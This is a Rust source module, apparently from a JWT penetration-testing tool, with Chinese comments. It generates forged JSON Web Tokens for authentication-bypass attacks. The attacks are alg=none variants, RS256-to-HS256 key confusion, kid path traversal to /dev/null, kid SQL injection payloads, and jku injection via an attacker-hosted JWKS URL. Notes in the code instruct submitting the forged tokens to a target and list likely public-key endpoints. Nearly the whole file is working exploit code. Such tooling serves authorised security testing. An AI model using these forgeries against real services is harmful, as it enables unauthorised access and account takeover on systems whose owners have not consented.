use crate::analyzer::parse_jwt;
use crate::bruteforce::{forge_token, forge_none_token};
use anyhow::Result;
use serde_json::Value;

pub struct ExploitResult {
    pub vuln_id: String,
    pub description: String,
    pub forged_tokens: Vec<(String, String)>, // (label, token)
    pub notes: String,
}

/// alg=none 攻击：生成所有none变体的token（不含签名）
pub fn exploit_alg_none(token: &str, custom_claims: Option<Value>) -> Result<ExploitResult> {
    let parsed = parse_jwt(token)?;
    let claims = custom_claims.unwrap_or_else(|| {
        serde_json::to_value(&parsed.payload).unwrap_or(Value::Object(Default::default()))
    });

    let tokens_str = forge_none_token(token, &claims)?;
    let variants: Vec<&str> = tokens_str.split("\n--- 变体 ---\n").collect();
    let labels = ["alg:none", "alg:None", "alg:NONE", "alg:nOnE"];

    let forged: Vec<(String, String)> = labels
        .iter()
        .zip(variants.iter())
        .map(|(l, t)| (l.to_string(), t.to_string()))
        .collect();

    Ok(ExploitResult {
        vuln_id: "JWT-001".to_string(),
        description: "Algorithm None攻击：生成无需签名的JWT".to_string(),
        forged_tokens: forged,
        notes: "将上述token逐一提交到目标，观察服务端是否接受".to_string(),
    })
}

/// 算法混淆攻击：RS256 → HS256（需提供公钥）
pub fn exploit_algorithm_confusion(
    token: &str,
    public_key: &str,
    custom_claims: Option<Value>,
) -> Result<ExploitResult> {
    let parsed = parse_jwt(token)?;
    let claims = custom_claims.unwrap_or_else(|| {
        serde_json::to_value(&parsed.payload).unwrap_or(Value::Object(Default::default()))
    });

    // 用公钥内容作为HMAC密钥重签
    let forged = forge_token(token, &claims, public_key, Some("HS256"))?;

    Ok(ExploitResult {
        vuln_id: "JWT-003".to_string(),
        description: "算法混淆攻击：将非对称算法改为HS256，用公钥内容作为HMAC密钥".to_string(),
        forged_tokens: vec![("HS256 with public key".to_string(), forged)],
        notes: "需先获取服务端公钥（常见路径：/.well-known/jwks.json, /api/auth/public-key）".to_string(),
    })
}

/// kid 路径遍历：生成多种 kid payload
pub fn exploit_kid_traversal(token: &str, secret: &str) -> Result<ExploitResult> {
    let parsed = parse_jwt(token)?;
    let claims = serde_json::to_value(&parsed.payload)?;

    let kid_payloads = vec![
        ("null file (Linux)", "../../dev/null"),
        ("proc null", "/proc/sys/kernel/ngroups_max"),
        ("empty secret via /dev/null", "../../../../dev/null"),
    ];

    let mut forged_tokens = Vec::new();
    for (label, kid_val) in kid_payloads {
        // 注入kid字段到header，签名使用指定secret
        let header = serde_json::json!({
            "alg": parsed.header.alg,
            "typ": "JWT",
            "kid": kid_val
        });
        let header_b64 = base64url_encode(&serde_json::to_string(&header)?);
        let payload_b64 = base64url_encode(&serde_json::to_string(&claims)?);
        let signing_input = format!("{}.{}", header_b64, payload_b64);
        // 用空字符串或提供的secret签名（/dev/null对应空文件）
        let use_secret = if label.contains("null") { "" } else { secret };
        let sig = hmac_sign(&parsed.header.alg, &signing_input, use_secret);
        forged_tokens.push((label.to_string(), format!("{}.{}.{}", header_b64, payload_b64, sig)));
    }

    Ok(ExploitResult {
        vuln_id: "JWT-004".to_string(),
        description: "kid路径遍历攻击：使用路径遍历payload让服务端读取可控文件作为密钥".to_string(),
        forged_tokens,
        notes: "当kid指向/dev/null时，文件内容为空，secret=''; 需要服务端存在路径遍历漏洞".to_string(),
    })
}

/// kid SQL注入：生成SQL注入payload
pub fn exploit_kid_sqli(token: &str, db_type: &str) -> Result<ExploitResult> {
    let parsed = parse_jwt(token)?;
    let claims = serde_json::to_value(&parsed.payload)?;

    let sql_payloads: Vec<(&str, &str, &str)> = match db_type.to_lowercase().as_str() {
        "mysql" => vec![
            ("MySQL UNION(空secret)", "' UNION SELECT '' -- -", ""),
            ("MySQL UNION(已知secret)", "' UNION SELECT 'mysecret' -- -", "mysecret"),
        ],
        "postgres" | "postgresql" => vec![
            ("PG UNION(空secret)", "' UNION SELECT '' -- -", ""),
            ("PG UNION(已知secret)", "' UNION SELECT 'mysecret' -- -", "mysecret"),
        ],
        _ => vec![
            ("Generic UNION(空secret)", "' UNION SELECT '' -- -", ""),
        ],
    };

    let mut forged_tokens = Vec::new();
    for (label, kid_val, secret) in sql_payloads {
        let header = serde_json::json!({
            "alg": parsed.header.alg,
            "typ": "JWT",
            "kid": kid_val
        });
        let header_b64 = base64url_encode(&serde_json::to_string(&header)?);
        let payload_b64 = base64url_encode(&serde_json::to_string(&claims)?);
        let signing_input = format!("{}.{}", header_b64, payload_b64);
        let sig = hmac_sign(&parsed.header.alg, &signing_input, secret);
        forged_tokens.push((label.to_string(), format!("{}.{}.{}", header_b64, payload_b64, sig)));
    }

    Ok(ExploitResult {
        vuln_id: "JWT-005".to_string(),
        description: "kid SQL注入攻击：通过SQL注入控制密钥内容".to_string(),
        forged_tokens,
        notes: "token中签名需与SQL注入查询返回值一致；需要服务端将kid直接拼入SQL查询".to_string(),
    })
}

/// jku 注入：生成使用外部JWKS URL的token结构说明
pub fn exploit_jku_injection(token: &str, attacker_jwks_url: &str) -> Result<ExploitResult> {
    let parsed = parse_jwt(token)?;
    let header = serde_json::json!({
        "alg": "RS256",
        "typ": "JWT",
        "jku": attacker_jwks_url,
        "kid": parsed.header.kid.unwrap_or_else(|| "attacker-key".to_string())
    });
    let header_b64 = base64url_encode(&serde_json::to_string(&header)?);
    let payload_b64 = parsed.raw.payload_b64.clone();

    Ok(ExploitResult {
        vuln_id: "JWT-006".to_string(),
        description: "jku注入：让服务端从攻击者控制的URL加载JWKS公钥".to_string(),
        forged_tokens: vec![
            ("jku_injected_header".to_string(),
             format!("Header(base64url): {}\nPayload: {}\n签名: 需用攻击者私钥生成", header_b64, payload_b64))
        ],
        notes: format!(
            "步骤：1. 在 {} 托管你的JWKS（含公钥）\n2. 用对应私钥对 {}.{} 签名\n3. 拼装完整token提交",
            attacker_jwks_url, header_b64, payload_b64
        ),
    })
}

// ---- 内部辅助 ----

fn base64url_encode(s: &str) -> String {
    use base64::{engine::general_purpose, Engine as _};
    general_purpose::STANDARD
        .encode(s.as_bytes())
        .replace('+', "-")
        .replace('/', "_")
        .trim_end_matches('=')
        .to_string()
}

fn hmac_sign(alg: &str, signing_input: &str, secret: &str) -> String {
    use hmac::{Hmac, Mac};
    use sha2::{Sha256, Sha384, Sha512};
    use base64::{engine::general_purpose, Engine as _};

    fn encode(bytes: &[u8]) -> String {
        general_purpose::STANDARD
            .encode(bytes)
            .replace('+', "-")
            .replace('/', "_")
            .trim_end_matches('=')
            .to_string()
    }

    match alg.to_uppercase().as_str() {
        "HS384" => {
            let mut mac = Hmac::<Sha384>::new_from_slice(secret.as_bytes()).unwrap();
            mac.update(signing_input.as_bytes());
            encode(&mac.finalize().into_bytes())
        }
        "HS512" => {
            let mut mac = Hmac::<Sha512>::new_from_slice(secret.as_bytes()).unwrap();
            mac.update(signing_input.as_bytes());
            encode(&mac.finalize().into_bytes())
        }
        _ => {
            let mut mac = Hmac::<Sha256>::new_from_slice(secret.as_bytes()).unwrap();
            mac.update(signing_input.as_bytes());
            encode(&mac.finalize().into_bytes())
        }
    }
}
